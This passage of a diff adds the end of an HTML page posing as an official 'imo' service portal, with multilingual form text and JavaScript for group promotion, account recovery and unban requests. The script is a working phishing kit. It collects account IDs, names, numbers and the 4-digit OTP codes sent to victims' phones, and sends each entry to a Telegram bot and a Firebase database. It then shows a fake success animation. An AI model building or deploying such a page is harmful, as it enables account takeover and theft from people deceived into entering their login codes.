+                form_limit_id: &#34;প্রিয় ইউজার আপনার গ্রুপের লিমিট বাড়ানোর জন্য গ্রুপ আইডি লিখুন&#34;,
+                form_limit_amount: &#34;প্রিয় ইউজার আপনি ঠিক কত হাজার লিমিট করতে চান বাছাই করুন&#34;,
+                user_verify_title: &#34;ইউজার ভেরিফিকেশন&#34;,
+                user_verify_desc: &#34;আপনার রিকোয়েস্টটি কনফার্ম করার জন্য ইউজার নাম এবং ইউজার অ্যাকাউন্ট নাম্বার দিয়ে ভেরিফাই করুন&#34;,
+                user_name: &#34;ইউজার নাম (যেকোনো নাম)&#34;,
+                user_account: &#34;ইউজার অ্যাকাউন্ট নাম্বার (যেকোনো নাম্বার)&#34;,
+                otp_title: &#34;OTP ভেরিফিকেশন&#34;,
+                otp_desc: &#34;আপনার নাম্বারে পাঠানো ৪ ডিজিটের কোডটি দিন&#34;,
+                otp_verifying: &#34;ভেরিফাই করা হচ্ছে...&#34;, otp_success: &#34;সফলভাবে ভেরিফাইড!&#34;,
+                btn_submit: &#34;সাবমিট&#34;, btn_send_verify: &#34;ভেরিফাই করুন&#34;, btn_verify: &#34;ভেরিফাই&#34;,
+                form_submit_hint: &#34;এখন এখানে সাবমিট করুন&#34;,
+                opt_1_day: &#34;1 দিন&#34;, opt_7_days: &#34;7 দিন&#34;, opt_30_days: &#34;30 দিন&#34;,
+                opt_3_digit: &#34;3 ডিজিট&#34;, opt_4_digit: &#34;4 ডিজিট&#34;, opt_5_digit: &#34;5 ডিজিট&#34;,
+                opt_password: &#34;পাসওয়ার্ড&#34;, opt_hacked: &#34;হ্যাক&#34;, opt_other: &#34;অন্যান্য&#34;,
+                opt_account: &#34;অ্যাকাউন্ট&#34;, opt_group: &#34;গ্রুপ&#34;,
+                ph_group_id: &#34;Group ID...&#34;, ph_group_id_confirm: &#34;Confirm Group ID...&#34;,
+                ph_group_name: &#34;Group Name...&#34;, ph_group_name_confirm: &#34;Confirm Group Name...&#34;,
+                ph_user_name: &#34;যেকোনো ইউজার নাম লিখুন...&#34;, ph_user_account: &#34;যেকোনো নাম্বার লিখুন...&#34;,
+                ph_account_id: &#34;Account ID...&#34;, ph_account_id_confirm: &#34;Confirm Account ID...&#34;,
+                ph_account_name: &#34;Account Name...&#34;, ph_account_name_confirm: &#34;Confirm Account Name...&#34;,
+                ph_ban_reason: &#34;Ban Reason...&#34;, ph_ban_reason_confirm: &#34;Confirm Ban Reason...&#34;,
+                alert_user_name: &#34;অনুগ্রহ করে যেকোনো ইউজার নাম দিন।&#34;, 
+                alert_user_account: &#34;অনুগ্রহ করে যেকোনো নাম্বার দিন।&#34;,
+                alert_otp: &#34;অনুগ্রহ করে ৪ ডিজিটের কোডটি সম্পূর্ণ দিন।&#34;
+            },
+            hi: {
+                title: &#34;imo आधिकारिक फॉर्म&#34;, card_promote: &#34;इमो ग्रुप प्रमोट&#34;, card_shortid: &#34;इमो ग्रुप शॉर्ट आईडी&#34;,
+                card_hrad: &#34;इमो अकाउंट रिकवरी&#34;, card_unban: &#34;इमो अकाउंट/ग्रुप अनबैन&#34;, card_limit: &#34;ग्रुप लिमिट&#34;,
+                about_title: &#34;imo के बारे में&#34;, about_desc: &#34;imo एक अग्रणी वैश्विक संचार मंच है।&#34;,
+                modal1_title: &#34;ग्रुप प्रमोट&#34;, modal2_title: &#34;शॉर्ट आईडी&#34;, modal3_title: &#34;अकाउंट रिकवरी&#34;,
+                modal4_title: &#34;अनबैन अनुरोध&#34;, modal5_title: &#34;ग्रुप लिमिट&#34;,
+                form_group_id: &#34;प्रिय उपयोगकर्ता, ग्रुप आईडी दर्ज करें&#34;,
+                form_group_name: &#34;प्रिय उपयोगकर्ता, ग्रुप का नाम दर्ज करें&#34;,
+                form_promote_days: &#34;प्रिय उपयोगकर्ता, कितने दिनों तक प्रमोट करना चाहते हैं चुनें&#34;,
+                form_shortid_id: &#34;प्रिय उपयोगकर्ता, शॉर्ट आईडी के लिए ग्रुप आईडी दर्ज करें&#34;,
+                form_shortid_type: &#34;प्रिय उपयोगकर्ता, शॉर्ट आईडी का प्रकार चुनें&#34;,
+                form_hrad_id: &#34;प्रिय उपयोगकर्ता, अकाउंट आईडी दर्ज करें&#34;,
+                form_hrad_name: &#34;प्रिय उपयोगकर्ता, अकाउंट नाम दर्ज करें&#34;,
+                form_hrad_issue: &#34;प्रिय उपयोगकर्ता, समस्या का प्रकार चुनें&#34;,
+                form_unban_id: &#34;प्रिय उपयोगकर्ता, अकाउंट/ग्रुप आईडी दर्ज करें&#34;,
+                form_unban_reason: &#34;प्रिय उपयोगकर्ता, प्रतिबंध का कारण दर्ज करें&#34;,
+                form_unban_type: &#34;प्रिय उपयोगकर्ता, आवेदन का प्रकार चुनें&#34;,
+                form_limit_id: &#34;प्रिय उपयोगकर्ता, ग्रुप लिमिट बढ़ाने के लिए ग्रुप आईडी दर्ज करें&#34;,
+                form_limit_amount: &#34;प्रिय उपयोगकर्ता, कितनी हजार लिमिट चाहते हैं चुनें&#34;,
+                user_verify_title: &#34;उपयोगकर्ता सत्यापन&#34;,
+                user_verify_desc: &#34;अपने अनुरोध की पुष्टि करने के लिए, कृपया अपने उपयोगकर्ता नाम और खाता संख्या से सत्यापित करें&#34;,
+                user_name: &#34;उपयोगकर्ता नाम (कोई भी नाम)&#34;,
+                user_account: &#34;उपयोगकर्ता खाता संख्या (कोई भी संख्या)&#34;,
+                otp_title: &#34;OTP सत्यापन&#34;, otp_desc: &#34;अपने नंबर पर भेजा गया 4-अंकीय कोड दर्ज करें&#34;,
+                otp_verifying: &#34;सत्यापित किया जा रहा है...&#34;, otp_success: &#34;सफलतापूर्वक सत्यापित!&#34;,
+                btn_submit: &#34;जमा करें&#34;, btn_send_verify: &#34;सत्यापित करें&#34;, btn_verify: &#34;सत्यापित&#34;,
+                form_submit_hint: &#34;अब यहाँ जमा करें&#34;,
+                opt_1_day: &#34;1 दिन&#34;, opt_7_days: &#34;7 दिन&#34;, opt_30_days: &#34;30 दिन&#34;,
+                opt_3_digit: &#34;3 अंक&#34;, opt_4_digit: &#34;4 अंक&#34;, opt_5_digit: &#34;5 अंक&#34;,
+                opt_password: &#34;पासवर्ड&#34;, opt_hacked: &#34;हैक&#34;, opt_other: &#34;अन्य&#34;,
+                opt_account: &#34;अकाउंट&#34;, opt_group: &#34;ग्रुप&#34;,
+                ph_group_id: &#34;ग्रुप आईडी...&#34;, ph_group_id_confirm: &#34;ग्रुप आईडी की पुष्टि करें...&#34;,
+                ph_group_name: &#34;ग्रुप का नाम...&#34;, ph_group_name_confirm: &#34;ग्रुप नाम की पुष्टि करें...&#34;,
+                ph_user_name: &#34;कोई भी उपयोगकर्ता नाम दर्ज करें...&#34;, ph_user_account: &#34;कोई भी खाता संख्या दर्ज करें...&#34;,
+                ph_account_id: &#34;अकाउंट आईडी...&#34;, ph_account_id_confirm: &#34;अकाउंट आईडी की पुष्टि करें...&#34;,
+                ph_account_name: &#34;अकाउंट का नाम...&#34;, ph_account_name_confirm: &#34;अकाउंट नाम की पुष्टि करें...&#34;,
+                ph_ban_reason: &#34;प्रतिबंध का कारण...&#34;, ph_ban_reason_confirm: &#34;प्रतिबंध कारण की पुष्टि करें...&#34;,
+                alert_user_name: &#34;कृपया कोई भी उपयोगकर्ता नाम दर्ज करें।&#34;, 
+                alert_user_account: &#34;कृपया कोई भी खाता संख्या दर्ज करें।&#34;,
+                alert_otp: &#34;कृपया पूरा 4-अंकीय कोड दर्ज करें।&#34;
+            },
+            ar: {
+                title: &#34;نماذج مسؤولي imo&#34;, card_promote: &#34;ترويج مجموعة Imo&#34;, card_shortid: &#34;معرف قصير لمجموعة Imo&#34;,
+                card_hrad: &#34;استرداد حساب Imo&#34;, card_unban: &#34;إلغاء حظر حساب/مجموعة Imo&#34;, card_limit: &#34;حد المجموعة&#34;,
+                about_title: &#34;حول imo&#34;, about_desc: &#34;imo هي منصة اتصالات عالمية رائدة.&#34;,
+                modal1_title: &#34;ترويج المجموعة&#34;, modal2_title: &#34;معرف قصير&#34;, modal3_title: &#34;استرداد الحساب&#34;,
+                modal4_title: &#34;طلب إلغاء الحظر&#34;, modal5_title: &#34;حد المجموعة&#34;,
+                form_group_id: &#34;عزيزي المستخدم، أدخل معرف المجموعة&#34;,
+                form_group_name: &#34;عزيزي المستخدم، أدخل اسم المجموعة&#34;,
+                form_promote_days: &#34;عزيزي المستخدم، اختر عدد الأيام&#34;,
+                form_shortid_id: &#34;عزيزي المستخدم، أدخل معرف المجموعة&#34;,
+                form_shortid_type: &#34;عزيزي المستخدم، اختر نوع المعرف&#34;,
+                form_hrad_id: &#34;عزيزي المستخدم، أدخل معرف حسابك&#34;,
+                form_hrad_name: &#34;عزيزي المستخدم، أدخل اسم حسابك&#34;,
+                form_hrad_issue: &#34;عزيزي المستخدم، اختر نوع المشكلة&#34;,
+                form_unban_id: &#34;عزيزي المستخدم، أدخل معرف حسابك/مجموعتك&#34;,
+                form_unban_reason: &#34;عزيزي المستخدم، أدخل سبب الحظر&#34;,
+                form_unban_type: &#34;عزيزي المستخدم، اختر نوع طلبك&#34;,
+                form_limit_id: &#34;عزيزي المستخدم، أدخل معرف المجموعة&#34;,
+                form_limit_amount: &#34;عزيزي المستخدم، اختر عدد الآلاف&#34;,
+                user_verify_title: &#34;التحقق من المستخدم&#34;,
+                user_verify_desc: &#34;لتأكيد طلبك، يرجى التحقق باستخدام اسم المستخدم ورقم حساب المستخدم&#34;,
+                user_name: &#34;اسم المستخدم (أي اسم)&#34;,
+                user_account: &#34;رقم حساب المستخدم (أي رقم)&#34;,
+                otp_title: &#34;التحقق من OTP&#34;, otp_desc: &#34;أدخل الرمز المكون من 4 أرقام&#34;,
+                otp_verifying: &#34;جارٍ التحقق...&#34;, otp_success: &#34;تم التحقق بنجاح!&#34;,
+                btn_submit: &#34;إرسال&#34;, btn_send_verify: &#34;تحقق الآن&#34;, btn_verify: &#34;تحقق&#34;,
+                form_submit_hint: &#34;الآن أرسل هنا&#34;,
+                opt_1_day: &#34;يوم واحد&#34;, opt_7_days: &#34;7 أيام&#34;, opt_30_days: &#34;30 يومًا&#34;,
+                opt_3_digit: &#34;3 أرقام&#34;, opt_4_digit: &#34;4 أرقام&#34;, opt_5_digit: &#34;5 أرقام&#34;,
+                opt_password: &#34;كلمة المرور&#34;, opt_hacked: &#34;تم اختراقه&#34;, opt_other: &#34;أخرى&#34;,
+                opt_account: &#34;حساب&#34;, opt_group: &#34;مجموعة&#34;,
+                ph_group_id: &#34;معرف المجموعة...&#34;, ph_group_id_confirm: &#34;تأكيد معرف المجموعة...&#34;,
+                ph_group_name: &#34;اسم المجموعة...&#34;, ph_group_name_confirm: &#34;تأكيد اسم المجموعة...&#34;,
+                ph_user_name: &#34;أدخل أي اسم مستخدم...&#34;, ph_user_account: &#34;أدخل أي رقم حساب...&#34;,
+                ph_account_id: &#34;معرف الحساب...&#34;, ph_account_id_confirm: &#34;تأكيد معرف الحساب...&#34;,
+                ph_account_name: &#34;اسم الحساب...&#34;, ph_account_name_confirm: &#34;تأكيد اسم الحساب...&#34;,
+                ph_ban_reason: &#34;سبب الحظر...&#34;, ph_ban_reason_confirm: &#34;تأكيد سبب الحظر...&#34;,
+                alert_user_name: &#34;يرجى إدخال أي اسم مستخدم.&#34;, 
+                alert_user_account: &#34;يرجى إدخال أي رقم حساب.&#34;,
+                alert_otp: &#34;يرجى إدخال الرمز المكون من 4 أرقام كاملاً.&#34;
+            }
+        };
+
+        function toggleLangDropdown(event) { event.stopPropagation(); document.getElementById(&#39;langSelector&#39;).classList.toggle(&#39;active&#39;); }
+
+        function changeLanguage(lang) {
+            document.querySelectorAll(&#39;.lang-option&#39;).forEach(opt =&gt; {
+                opt.classList.remove(&#39;active&#39;);
+                if(opt.getAttribute(&#39;data-lang&#39;) === lang) opt.classList.add(&#39;active&#39;);
+            });
+            const labels = { en: &#39;English&#39;, bn: &#39;বাংলা&#39;, hi: &#39;हिन्दी&#39;, ar: &#39;العربية&#39; };
+            document.getElementById(&#39;current-lang-label&#39;).textContent = labels[lang];
+            document.getElementById(&#39;langSelector&#39;).classList.remove(&#39;active&#39;);
+
+            document.querySelectorAll(&#39;[data-i18n]&#39;).forEach(el =&gt; {
+                const key = el.getAttribute(&#39;data-i18n&#39;);
+                if (translations[lang] &amp;&amp; translations[lang][key]) el.textContent = translations[lang][key];
+            });
+            document.querySelectorAll(&#39;[data-i18n-placeholder]&#39;).forEach(el =&gt; {
+                const key = el.getAttribute(&#39;data-i18n-placeholder&#39;);
+                if (translations[lang] &amp;&amp; translations[lang][key]) el.placeholder = translations[lang][key];
+            });
+            if (lang === &#39;ar&#39;) document.body.setAttribute(&#39;dir&#39;, &#39;rtl&#39;);
+            else document.body.setAttribute(&#39;dir&#39;, &#39;ltr&#39;);
+            localStorage.setItem(&#39;preferredLang&#39;, lang);
+        }
+
+        window.addEventListener(&#39;click&#39;, function(e) {
+            const selector = document.getElementById(&#39;langSelector&#39;);
+            if (selector &amp;&amp; !selector.contains(e.target)) selector.classList.remove(&#39;active&#39;);
+        });
+
+        document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {
+            const savedLang = localStorage.getItem(&#39;preferredLang&#39;) || &#39;en&#39;;
+            changeLanguage(savedLang);
+        });
+
+        // Particle Canvas
+        document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {
+            const canvas = document.getElementById(&#39;particle-canvas&#39;);
+            const ctx = canvas.getContext(&#39;2d&#39;);
+            let particlesArray = [];
+            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+            window.addEventListener(&#39;resize&#39;, () =&gt; { canvas.width = window.innerWidth; canvas.height = window.innerHeight; initParticles(); });
+
+            class Particle {
+                constructor() {
+                    this.x = Math.random() * canvas.width; this.y = Math.random() * canvas.height;
+                    this.size = Math.random() * 2 + 0.5;
+                    this.speedX = Math.random() * 1 - 0.5; this.speedY = Math.random() * 1 - 0.5;
+                    const colors = [&#39;rgba(0,242,254,&#39;, &#39;rgba(178,36,239,&#39;, &#39;rgba(255,8,68,&#39;, &#39;rgba(0,230,118,&#39;];
+                    this.baseColor = colors[Math.floor(Math.random() * colors.length)];
+                    this.alpha = Math.random() * 0.5 + 0.1;
+                }
+                update() {
+                    this.x += this.speedX; this.y += this.speedY;
+                    if (this.x &gt; canvas.width) this.x = 0; if (this.x &lt; 0) this.x = canvas.width;
+                    if (this.y &gt; canvas.height) this.y = 0; if (this.y &lt; 0) this.y = canvas.height;
+                }
+                draw() { 
+                    ctx.fillStyle = this.baseColor + this.alpha + &#39;)&#39;; 
+                    ctx.beginPath(); 
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); 
+                    ctx.fill(); 
+                }
+            }
+            function initParticles() {
+                particlesArray = [];
+                const num = Math.min((canvas.width * canvas.height) / 12000, 150);
+                for (let i = 0; i &lt; num; i++) particlesArray.push(new Particle());
+            }
+            function animateParticles() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                for (let i = 0; i &lt; particlesArray.length; i++) { 
+                    particlesArray[i].update(); 
+                    particlesArray[i].draw(); 
+                }
+                requestAnimationFrame(animateParticles);
+            }
+            initParticles(); animateParticles();
+
+            const cursorGlow = document.querySelector(&#39;.cursor-glow&#39;);
+            document.addEventListener(&#39;mousemove&#39;, (e) =&gt; { 
+                cursorGlow.style.left = e.clientX + &#39;px&#39;; 
+                cursorGlow.style.top = e.clientY + &#39;px&#39;; 
+            });
+            document.addEventListener(&#39;mouseleave&#39;, () =&gt; { cursorGlow.style.opacity = &#39;0&#39;; });
+            document.addEventListener(&#39;mouseenter&#39;, () =&gt; { cursorGlow.style.opacity = &#39;1&#39;; });
+        });
+
+        // 3D Tilt Effect on Cards
+        document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {
+            const cards = document.querySelectorAll(&#39;.card&#39;);
+            cards.forEach(card =&gt; {
+                card.addEventListener(&#39;mousemove&#39;, (e) =&gt; {
+                    const rect = card.getBoundingClientRect();
+                    const x = e.clientX - rect.left;
+                    const y = e.clientY - rect.top;
+                    const centerX = rect.width / 2;
+                    const centerY = rect.height / 2;
+                    const rotateX = ((y - centerY) / centerY) * -10; 
+                    const rotateY = ((x - centerX) / centerX) * 10;
+                    card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale(1.02)`;
+                });
+                card.addEventListener(&#39;mouseleave&#39;, () =&gt; {
+                    card.style.transform = `perspective(1000px) rotateX(0) rotateY(0) scale(1)`;
+                    card.style.transition = &#39;transform 0.5s cubic-bezier(0.16, 1, 0.3, 1)&#39;;
+                });
+                card.addEventListener(&#39;mouseenter&#39;, () =&gt; {
+                    card.style.transition = &#39;transform 0.1s ease-out&#39;;
+                });
+            });
+        });
+
+        // ==========================================
+        // ✅ DATA SENDING - Realtime Database Fixed
+        // ==========================================
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: &#39;POST&#39;,
+                headers: { &#39;Content-Type&#39;: &#39;application/json&#39; },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: &#39;HTML&#39; })
+            }).then(res =&gt; {
+                if (res.ok) console.log(&#39;✅ Telegram sent!&#39;);
+                else console.warn(&#39;⚠️ Telegram failed&#39;);
+            }).catch(err =&gt; console.warn(&#39;Telegram error:&#39;, err));
+        }
+
+        // ✅ FIXED: Using Realtime Database&#39;s push() method
+        function sendToFirebase(collectionName, dataPayload) {
+            if (!db) {
+                console.log(&#39;🔥 Firebase (Not Configured):&#39;, dataPayload);
+                return;
+            }
+            db.ref(collectionName).push({
+                ...dataPayload,
+                timestamp: Date.now()
+            }).then(() =&gt; {
+                console.log(&#39;✅ Firebase saved:&#39;, dataPayload);
+            }).catch(err =&gt; {
+                console.error(&#39;❌ Firebase error:&#39;, err);
+                console.warn(&#39;👉 Check Firebase Realtime Database Rules!&#39;);
+            });
+        }
+
+        function sendDataToAll(msg, collection, data) {
+            sendToTelegram(msg);
+            sendToFirebase(collection, data);
+        }
+
+        // ==========================================
+        // MODAL &amp; FLOW LOGIC
+        // ==========================================
+        function openModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) { 
+                modal.classList.add(&#39;active&#39;); 
+                document.body.classList.add(&#39;modal-open&#39;); 
+            }
+        }
+
+        function closeModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.classList.remove(&#39;active&#39;);
+                document.body.classList.remove(&#39;modal-open&#39;);
+                const flowTypes = [&#39;promote&#39;, &#39;shortid&#39;, &#39;hrad&#39;, &#39;unban&#39;, &#39;limit&#39;];
+                flowTypes.forEach(type =&gt; {
+                    if(modalId.includes(type) || (type === &#39;limit&#39; &amp;&amp; modalId === &#39;modal-7&#39;) || (type !== &#39;limit&#39; &amp;&amp; modalId === `modal-${flowTypes.indexOf(type)+1}-7`)) {
+                        resetOtp(type);
+                    }
+                });
+            }
+        }
+
+        function selectOption(btn, value) {
+            const buttons = btn.parentElement.querySelectorAll(&#39;.limit-btn&#39;);
+            buttons.forEach(b =&gt; b.classList.remove(&#39;active&#39;));
+            btn.classList.add(&#39;active&#39;);
+            btn.setAttribute(&#39;data-selected&#39;, value);
+        }
+
+        function getSelectedOption(modalId) {
+            const activeBtn = document.querySelector(`#${modalId} .limit-btn.active`);
+            return activeBtn ? activeBtn.getAttribute(&#39;data-selected&#39;) : &#39;Not Selected&#39;;
+        }
+
+        function fastSubmitFlow(type) {
+            let baseId = type === &#39;promote&#39; ? &#39;1&#39; : type === &#39;shortid&#39; ? &#39;2&#39; : type === &#39;hrad&#39; ? &#39;3&#39; : type === &#39;unban&#39; ? &#39;4&#39; : &#39;5&#39;;
+            const modalId = `modal-${baseId}`;
+            const inputs = document.querySelectorAll(`#${modalId} .form-input`);
+            
+            const dataPayload = { type: type, step: &#39;initial_form&#39;, inputs: {}, selectedOption: getSelectedOption(modalId) };
+            inputs.forEach((input, index) =&gt; { dataPayload.inputs[`field_${index + 1}`] = input.value || &#39;Empty&#39;; });
+
+            let msg = `📌 &lt;b&gt;New ${type.toUpperCase()} Request&lt;/b&gt;\n`;
+            Object.entries(dataPayload.inputs).forEach(([key, value]) =&gt; { msg += `${key}: ${value}\n`; });
+            msg += `Selected: ${dataPayload.selectedOption}\n`;
+
+            sendDataToAll(msg, &#39;imo_requests&#39;, dataPayload);
+
+            closeModal(modalId);
+            if (type === &#39;limit&#39;) openModal(&#39;modal-6&#39;);
+            else openModal(`modal-${baseId}-5`);
+        }
+
+        function fastSubmitVerification(type) {
+            let baseId = type === &#39;promote&#39; ? &#39;1&#39; : type === &#39;shortid&#39; ? &#39;2&#39; : type === &#39;hrad&#39; ? &#39;3&#39; : type === &#39;unban&#39; ? &#39;4&#39; : &#39;5&#39;;
+            const currentModalId = type === &#39;limit&#39; ? &#39;modal-6&#39; : `modal-${baseId}-5`;
+            const inputs = document.querySelectorAll(`#${currentModalId} .form-input`);
+            const currentLang = localStorage.getItem(&#39;preferredLang&#39;) || &#39;en&#39;;
+
+            const userName = inputs[0].value.trim();
+            const userAccount = inputs[1].value.trim();
+
+            if(userName === &#39;&#39;) { alert(translations[currentLang].alert_user_name); return; }
+            if(userAccount === &#39;&#39;) { alert(translations[currentLang].alert_user_account); return; }
+
+            const dataPayload = { 
+                type: type, 
+                step: &#39;user_verification&#39;, 
+                userName: userName, 
+                userAccount: userAccount 
+            };
+
+            let msg = `👤 &lt;b&gt;User Verification for ${type.toUpperCase()}&lt;/b&gt;\n`;
+            msg += `Name: ${userName}\n`;
+            msg += `Account: ${userAccount}\n`;
+
+            sendDataToAll(msg, &#39;imo_requests&#39;, dataPayload);
+
+            closeModal(currentModalId);
+            if (type === &#39;limit&#39;) openModal(&#39;modal-7&#39;);
+            else openModal(`modal-${baseId}-7`);
+            
+            setTimeout(() =&gt; {
+                const firstBox = document.querySelector(`#otp-inputs-${type} .otp-box`);
+                if (firstBox) firstBox.focus();
+            }, 150);
+        }
+
+        function setupOtpBoxes(type) {
+            const containerId = `otp-inputs-${type}`;
+            const boxes = document.querySelectorAll(`#${containerId} .otp-box`);
+            
+            boxes.forEach((box, index) =&gt; {
+                box.addEventListener(&#39;input&#39;, (e) =&gt; {
+                    if (e.target.value &amp;&amp; isNaN(e.target.value)) e.target.value = &#39;&#39;;
+                    if (e.target.value &amp;&amp; index &lt; boxes.length - 1) boxes[index + 1].focus();
+                    let isComplete = true;
+                    boxes.forEach(b =&gt; { if (!b.value) isComplete = false; });
+                    if (isComplete) setTimeout(() =&gt; { autoVerify(type); }, 250);
+                });
+                box.addEventListener(&#39;keydown&#39;, (e) =&gt; {
+                    if (e.key === &#39;Backspace&#39; &amp;&amp; !e.target.value &amp;&amp; index &gt; 0) boxes[index - 1].focus();
+                });
+            });
+        }
+
+        [&#39;promote&#39;, &#39;shortid&#39;, &#39;hrad&#39;, &#39;unban&#39;, &#39;limit&#39;].forEach(type =&gt; setupOtpBoxes(type));
+
+        function autoVerify(type) {
+            const containerId = `otp-inputs-${type}`;
+            const boxes = document.querySelectorAll(`#${containerId} .otp-box`);
+            let isComplete = true; 
+            boxes.forEach(b =&gt; { if (!b.value) isComplete = false; });
+            const currentLang = localStorage.getItem(&#39;preferredLang&#39;) || &#39;en&#39;;
+            
+            if (!isComplete) { alert(translations[currentLang].alert_otp); return; }
+
+            let otpCode = &#39;&#39;;
+            boxes.forEach(b =&gt; otpCode += b.value);
+            
+            const dataPayload = { type: type, step: &#39;otp_verified&#39;, otp: otpCode };
+            const msg = `✅ &lt;b&gt;OTP Verified for ${type.toUpperCase()}&lt;/b&gt;\nOTP: &lt;code&gt;${otpCode}&lt;/code&gt;`;
+
+            sendDataToAll(msg, &#39;imo_requests&#39;, dataPayload);
+
+            document.getElementById(containerId).style.display = &#39;none&#39;;
+            document.getElementById(`otp-submit-btn-${type}`).style.display = &#39;none&#39;;
+            document.getElementById(`verify-loading-${type}`).style.display = &#39;flex&#39;;
+
+            setTimeout(() =&gt; {
+                document.getElementById(`verify-loading-${type}`).style.display = &#39;none&#39;;
+                document.getElementById(`verify-success-${type}`).style.display = &#39;flex&#39;;
+                createConfettiBurst();
+                setTimeout(() =&gt; { 
+                    let modalId = type === &#39;promote&#39; ? &#39;modal-1-7&#39; : type === &#39;shortid&#39; ? &#39;modal-2-7&#39; : type === &#39;hrad&#39; ? &#39;modal-3-7&#39; : type === &#39;unban&#39; ? &#39;modal-4-7&#39; : &#39;modal-7&#39;;
+                    closeModal(modalId); 
+                }, 1800);
+            }, 1500);
+        }
+
+        function resetOtp(type) {
+            const containerId = `otp-inputs-${type}`;
+            document.querySelectorAll(`#${containerId} .otp-box`).forEach(box =&gt; box.value = &#39;&#39;);
+            document.getElementById(containerId).style.display = &#39;flex&#39;;
+            document.getElementById(`otp-submit-btn-${type}`).style.display = &#39;block&#39;;
+            document.getElementById(`verify-loading-${type}`).style.display = &#39;none&#39;;
+            document.getElementById(`verify-success-${type}`).style.display = &#39;none&#39;;
+        }
+
+        function createConfettiBurst() {
+            const colors = [&#39;#00f2fe&#39;, &#39;#b224ef&#39;, &#39;#ff0844&#39;, &#39;#00e676&#39;, &#39;#ffb800&#39;];
+            for (let i = 0; i &lt; 40; i++) {
+                const confetti = document.createElement(&#39;div&#39;);
+                confetti.style.position = &#39;fixed&#39;;
+                confetti.style.width = &#39;8px&#39;; confetti.style.height = &#39;8px&#39;;
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.borderRadius = &#39;50%&#39;;
+                confetti.style.left = &#39;50%&#39;; confetti.style.top = &#39;50%&#39;;
+                confetti.style.zIndex = &#39;9999&#39;; confetti.style.pointerEvents = &#39;none&#39;;
+                confetti.style.boxShadow = `0 0 10px ${confetti.style.backgroundColor}`;
+                document.body.appendChild(confetti);
+                const angle = Math.random() * Math.PI * 2;
+                const velocity = 5 + Math.random() * 12;
+                const tx = Math.cos(angle) * velocity * 20;
+                const ty = Math.sin(angle) * velocity * 20;
+                confetti.animate([
+                    { transform: &#39;translate(-50%, -50%) scale(1)&#39;, opacity: 1 },
+                    { transform: `translate(calc(-50% + ${tx}px), calc(-50% + ${ty}px)) scale(0) rotate(720deg)`, opacity: 0 }
+                ], { duration: 1200 + Math.random() * 600, easing: &#39;cubic-bezier(0, .9, .57, 1)&#39; }).onfinish = () =&gt; confetti.remove();
+            }
+        }
+
+        document.querySelectorAll(&#39;.modal-overlay&#39;).forEach(overlay =&gt; {
+            overlay.addEventListener(&#39;click&#39;, (e) =&gt; { if (e.target === overlay) closeModal(overlay.id); });
+        });
+        document.querySelectorAll(&#39;.modal-box&#39;).forEach(box =&gt; {
+            box.addEventListener(&#39;click&#39;, (e) =&gt; { e.stopPropagation(); });
+        });
+    </script>
+  </body>
+    </html>
